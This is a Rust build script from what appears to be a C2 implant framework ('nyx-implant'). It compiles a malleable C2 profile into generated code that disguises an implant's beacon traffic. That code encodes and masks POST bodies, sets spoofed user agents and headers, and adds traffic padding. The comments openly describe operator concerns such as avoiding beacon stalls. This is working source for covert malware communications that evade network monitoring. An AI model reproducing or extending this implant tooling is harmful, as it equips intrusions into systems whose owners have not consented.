//! Build script for nyx-implant-net.
//!
//! One compile-time bake (moved from nyx-implant-win's build.rs in the WP-C
//! crate split, together with the `envelopes` module that consumes it):
//!
//! **Malleable C2 envelopes** (`OUT_DIR/envelopes.rs`) — see `bake_envelopes`.
//! When `NYX_PROFILE` is set, parse it (host-side, full nyx-profile std) and
//! emit Rust source reconstructing the http-post client/server envelope
//! shapes; the runtime `envelopes.rs` includes it.
//!
//! The generated source compiles inside THIS crate, so heap paths in the
//! templates are fully qualified as `nyx_implant_core::heap::…` (before the
//! split they were `crate::heap::…`); `nyx_profile::transform` paths are
//! unchanged.

use std::env;
use std::fs;
use std::path::Path;

fn main() {
    println!("cargo:rerun-if-env-changed=NYX_PROFILE");

    bake_envelopes();
}

/// Bake `TIMING_BASELINE_BURSTY` into `OUT_DIR/timing.rs` (host-includable,
/// no implant-core heap types). Default false when `NYX_PROFILE` is unset.
fn bake_timing(bursty: bool) {
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("timing.rs");
    fs::write(
        &dest,
        format!("pub const TIMING_BASELINE_BURSTY: bool = {bursty};\n"),
    )
    .unwrap();
}

// ---- malleable C2 envelopes (profile → baked Step/Terminator) -------------

/// When `NYX_PROFILE` is set, parse it (host-side, full nyx-profile std) and
/// emit `OUT_DIR/envelopes.rs`: Rust source reconstructing the http-post
/// **client** (request) and **server** (response) envelope shapes as
/// `nyx_profile::transform::{Step, Terminator}` values. The PIC implant then
/// applies the client shape to each POST body before send and inverts the server
/// shape on each response — making beacon traffic malleable in BOTH directions
/// without the implant pulling std (only the pure transform engine is no_std).
///
/// The implant only ever POSTs (check-in + tasking are both POST frames to one
/// URI), so only the http-post envelopes are baked. When `NYX_PROFILE` is unset,
/// a no-op envelopes.rs is emitted (empty steps, None terminator, empty UA) and
/// the transport sends raw frames — the pre-Phase-1 behaviour.
fn bake_envelopes() {
    let src = match env::var("NYX_PROFILE") {
        Ok(path) => {
            let p = Path::new(&path);
            println!("cargo:rerun-if-changed={}", p.display());
            fs::read_to_string(p)
                .unwrap_or_else(|e| panic!("NYX_PROFILE={} unreadable: {e}", p.display()))
        }
        Err(_) => {
            let out_dir = env::var("OUT_DIR").unwrap();
            let dest = Path::new(&out_dir).join("envelopes.rs");
            fs::write(&dest, emit_envelopes_none()).unwrap();
            bake_timing(false);
            return;
        }
    };

    let profile =
        nyx_profile::parse(&src).unwrap_or_else(|e| panic!("NYX_PROFILE parse error: {e}"));
    let errs: Vec<_> = nyx_profile::lint(&profile)
        .into_iter()
        .filter(|d| d.severity == nyx_profile::Severity::Error)
        .collect();
    if !errs.is_empty() {
        let msgs: Vec<_> = errs
            .iter()
            .map(|d| format!("  line {}: {}", d.line, d.message))
            .collect();
        panic!(
            "NYX_PROFILE has {} lint error(s):\n{}",
            errs.len(),
            msgs.join("\n")
        );
    }

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("envelopes.rs");
    fs::write(&dest, emit_envelopes(&profile)).unwrap();
    bake_timing(profile.timing_baseline() == nyx_profile::TimingBaseline::Bursty);
}

/// Emit the resolved http-post client (request) + server (response) envelopes.
/// The generated source uses fully-qualified paths (no `use` imports) so there
/// are no unused-import warnings regardless of which fields a profile sets.
fn emit_envelopes(profile: &nyx_profile::Profile) -> String {
    let client = nyx_profile::post_client_envelope(profile);
    let server = nyx_profile::post_server_envelope(profile);
    // Reject terminators the PIC transport doesn't speak yet — at BUILD time so
    // the operator gets a loud failure, not a silent runtime beacon stall (the
    // F2/F5 class: implant sends body / can't read response header → retries
    // forever against a correctly-configured server).
    if let Some(nyx_profile::Terminator::Parameter(p)) = &client.terminator {
        panic!(
            "NYX_PROFILE: http-post client `parameter \"{}\";` terminator is unsupported — \
             the implant doesn't build URL query strings. Use `print;` or `header \"...\";`.",
            p
        );
    }
    if let Some(nyx_profile::Terminator::Header(h)) = &server.terminator {
        panic!(
            "NYX_PROFILE: http-post server response `header \"{}\";` terminator is unsupported — \
             the implant doesn't query response headers yet. Use `print;` so the frame rides in \
             the response body.",
            h
        );
    }
    let mut s = String::new();
    s.push_str("// Generated by build.rs from NYX_PROFILE. Do not edit by hand.\n");
    s.push_str("// http-post malleable C2 envelopes (client = request, server = response).\n\n");
    s.push_str(&format!(
        "pub static POST_CLIENT_UA: &[u8] = &{};\n",
        byte_array(client.useragent.as_deref().unwrap_or(&[]))
    ));
    s.push_str(&format!(
        "pub fn post_client_steps() -> nyx_implant_core::heap::Vec<nyx_profile::transform::Step> {{ {} }}\n",
        steps_expr(&client.steps)
    ));
    s.push_str(&format!(
        "pub fn post_client_terminator() -> Option<nyx_profile::transform::Terminator> {{ {} }}\n",
        terminator_expr(&client.terminator)
    ));
    s.push_str(&format!(
        "pub fn post_client_headers() -> nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])> {{ {} }}\n",
        headers_expr(&client.headers)
    ));
    s.push_str(&format!(
        "pub fn post_server_steps() -> nyx_implant_core::heap::Vec<nyx_profile::transform::Step> {{ {} }}\n",
        steps_expr(&server.steps)
    ));
    s.push_str(&format!(
        "pub fn post_server_terminator() -> Option<nyx_profile::transform::Terminator> {{ {} }}\n",
        terminator_expr(&server.terminator)
    ));
    // Traffic-shaping padding range (top-level `set padding_min/max`), baked as
    // a plain `(min, max)` tuple — both 0 when the profile doesn't set them.
    s.push_str(&format!(
        "pub fn post_client_padding() -> (usize, usize) {{ ({}, {}) }}\n",
        client.padding_min, client.padding_max
    ));
    s.push_str(&format!(
        "pub fn post_server_padding() -> (usize, usize) {{ ({}, {}) }}\n",
        server.padding_min, server.padding_max
    ));
    s
}

/// No-op envelopes for builds without NYX_PROFILE: empty steps, None
/// terminator, empty UA → transport sends raw frames (pre-Phase-1 behaviour).
fn emit_envelopes_none() -> &'static str {
    "// Generated by build.rs — NYX_PROFILE was unset, so envelopes are no-ops.\n\
     // Transport sends raw frames and parses raw responses (pre-Phase-1 behaviour).\n\n\
     pub static POST_CLIENT_UA: &[u8] = &[];\n\
     pub fn post_client_steps() -> nyx_implant_core::heap::Vec<nyx_profile::transform::Step> { nyx_implant_core::heap::Vec::new() }\n\
     pub fn post_client_terminator() -> Option<nyx_profile::transform::Terminator> { None }\n\
     pub fn post_client_headers() -> nyx_implant_core::heap::Vec<(&'static [u8], &'static [u8])> { nyx_implant_core::heap::Vec::new() }\n\
     pub fn post_server_steps() -> nyx_implant_core::heap::Vec<nyx_profile::transform::Step> { nyx_implant_core::heap::Vec::new() }\n\
     pub fn post_server_terminator() -> Option<nyx_profile::transform::Terminator> { None }\n\
     pub fn post_client_padding() -> (usize, usize) { (0, 0) }\n\
     pub fn post_server_padding() -> (usize, usize) { (0, 0) }\n"
}

/// Render a byte slice as a Rust array literal `[0xNN, ...]`.
fn byte_array(b: &[u8]) -> String {
    let mut s = String::from("[");
    for (i, &x) in b.iter().enumerate() {
        if i > 0 {
            s.push_str(", ");
        }
        s.push_str(&format!("0x{:02X}", x));
    }
    s.push(']');
    s
}

/// Render a step list as a `nyx_implant_core::heap::vec![...]` expression (or
/// `Vec::new()`).
fn steps_expr(steps: &[nyx_profile::Step]) -> String {
    if steps.is_empty() {
        return String::from("nyx_implant_core::heap::Vec::new()");
    }
    let parts: Vec<String> = steps
        .iter()
        .map(|st| match st {
            nyx_profile::Step::Base64 => String::from("nyx_profile::transform::Step::Base64"),
            nyx_profile::Step::Base64Url => String::from("nyx_profile::transform::Step::Base64Url"),
            nyx_profile::Step::Netbios => String::from("nyx_profile::transform::Step::Netbios"),
            nyx_profile::Step::NetbiosU => String::from("nyx_profile::transform::Step::NetbiosU"),
            nyx_profile::Step::Mask => String::from("nyx_profile::transform::Step::Mask"),
            nyx_profile::Step::Prepend(b) => format!(
                "nyx_profile::transform::Step::Prepend(nyx_implant_core::heap::vec!{})",
                byte_array(b)
            ),
            nyx_profile::Step::Append(b) => format!(
                "nyx_profile::transform::Step::Append(nyx_implant_core::heap::vec!{})",
                byte_array(b)
            ),
        })
        .collect();
    format!("nyx_implant_core::heap::vec![{}]", parts.join(", "))
}

/// Render an `Option<Terminator>` as a Rust expression.
fn terminator_expr(t: &Option<nyx_profile::Terminator>) -> String {
    match t {
        None => String::from("None"),
        Some(nyx_profile::Terminator::Print) => {
            String::from("Some(nyx_profile::transform::Terminator::Print)")
        }
        Some(nyx_profile::Terminator::UriAppend) => {
            String::from("Some(nyx_profile::transform::Terminator::UriAppend)")
        }
        Some(nyx_profile::Terminator::Header(name)) => format!(
            "Some(nyx_profile::transform::Terminator::Header(nyx_implant_core::heap::String::from({:?})))",
            name
        ),
        Some(nyx_profile::Terminator::Parameter(name)) => format!(
            "Some(nyx_profile::transform::Terminator::Parameter(nyx_implant_core::heap::String::from({:?})))",
            name
        ),
    }
}

/// Render static `header "N" "V";` pairs as a `vec![(&[u8], &[u8])]` expression.
fn headers_expr(h: &[(Vec<u8>, Vec<u8>)]) -> String {
    if h.is_empty() {
        return String::from("nyx_implant_core::heap::Vec::new()");
    }
    let parts: Vec<String> = h
        .iter()
        .map(|(n, v)| format!("(&{}[..], &{}[..])", byte_array(n), byte_array(v)))
        .collect();
    format!("nyx_implant_core::heap::vec![{}]", parts.join(", "))
}
